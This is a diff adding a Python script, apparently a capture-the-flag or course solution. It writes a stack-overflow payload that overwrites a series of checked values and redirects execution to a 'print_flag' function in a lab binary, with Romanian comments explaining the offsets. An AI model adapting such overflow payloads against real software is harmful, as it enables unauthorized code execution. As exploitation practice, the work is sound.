@@ -1,0 +1,49 @@
+#!/usr/bin/env python3
+
+import sys
+
+compare1 = 57 * b"C" + b"\xdc\x09\x0c\x2a"
+compare2 = 94 * b"C" + b"\x4f\xe6\x43\xf6"
+
+# tot trial & error si 3
+compare3 = 305 * b"C" + b"\x6f\xf5\xd6\x50"
+# call a iesit simplu ca a fost offset-ul fata de compare3
+# adresa pe care o apeleaza e print_flag+0
+call = 29 * b"C" + b"\x91\x92\x04\x08"#b"\x62\x94\x04\x08"
+
+# si compare4 a iesit simplu ca era 2 offset intre val pe stack
+# si inceputul bufferului si pentru ca n-au fost probleme la stdin
+compare4 = 2 * b"C" + b"\x0c\x15\x0b\xc4"
+# 30 e offset-ul dintre compare4 si compare6 (ambele sunt la 0xffffcdXX)
+compare6 = 30 * b"C" + b"\x82\x0b\x6c\x26"
+
+# compare5 n-a avut nicio logica la offset, l-am facut dupa ureche(vorbind de 440)
+# am scazut 34 din cauza compare6-ului adaugat inainte de el(compare 5 e la 0xffffceXX)
+# am scazut 193 din cauza compare7-ului adaugat inainte de el
+compare5 = (440 - 34 - 193) * b"C" + b"\xfe\xc1\x50\x24"
+
+#go_to_puts = 446 * b"C" + b"\x
+
+# 189 e offset-ul fata de compare6
+compare7 = 189 * b"C" + b"\x54\xdb\xe1\x77" 
+
+sys.stdout.buffer.write(compare1 + compare2)
+# cum am afisat compare2 cu compare1, a trebuit sa afisez ceva
+# si la read@plt de dinainte de comparatia 2
+sys.stdout.buffer.write(b"A")
+
+# call e in aceeasi functie cu compare3 in care e doar un read@plt
+sys.stdout.buffer.write(compare3 + call)
+
+# read@plt de dinainte de compare6 se intalnea cu un null pointer care il bloca
+# asa ca l-am modificat de la citirea de dinainte de compare 4
+# am putut face asta pentru ca termenii erau vecini(0xffffcd05 si 0xffffcd27)
+# in acelasi mod am adaugat si compare7(motiv -> bufferele de dinainte ii
+# propulsau bufferul dupa termenul ce trebuia suprascris)
+sys.stdout.buffer.write(compare4 + compare6 + compare7)
+
+# compare 5 e dupa compare 6 (la 0xffffce80) - ma refer la termenul de suprascris
+sys.stdout.buffer.write(compare5)
+
+
+
